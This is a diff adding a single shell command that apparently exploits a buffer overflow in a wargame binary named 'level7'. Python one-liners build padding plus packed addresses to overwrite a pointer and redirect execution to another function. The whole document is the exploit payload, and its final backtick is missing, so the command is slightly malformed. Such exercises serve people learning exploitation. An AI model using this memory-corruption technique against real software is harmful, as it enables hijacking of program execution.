@@ -1,0 +1,1 @@
+./level7 `python -c 'import struct; import sys; sys.stdout.write("A"*8 + "B"*4 + "C"*4 + "D"*4 + struct.pack("<I", 0x08049928))'` `python -c 'import struct; import sys; sys.stdout.write(struct.pack("<I", 0x080484f4))'
